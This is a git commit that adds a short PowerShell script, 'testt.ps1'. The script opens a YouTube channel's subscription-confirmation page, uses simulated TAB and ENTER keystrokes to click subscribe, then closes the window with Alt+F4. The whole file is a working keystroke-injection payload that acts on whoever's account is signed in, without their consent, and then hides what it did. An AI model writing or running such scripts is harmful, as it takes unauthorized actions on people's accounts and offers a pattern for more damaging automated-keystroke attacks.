c650a6ca243211438fd481af999966f10286b123
HackerGeo <42976769+HackerGeo-sp1ne@users.noreply.github.com>
2024-03-21 18:16:04 +0200

    Create testt.ps1

---
+++ testt.ps1
@@ -0,0 +1,9 @@
+Add-Type -AssemblyName System.Windows.Forms
+$o=New-Object -ComObject WScript.Shell
+$url = -join("https://www.youtube.com/@deepmemories","?sub_confirmation=1")
+Start-Process "$url" 
+Start-Sleep -Seconds 5
+[System.Windows.Forms.SendKeys]::SendWait('{TAB}'*2)
+[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
+Start-Sleep -Seconds 1
+[System.Windows.Forms.SendKeys]::SendWait('%{F4}')
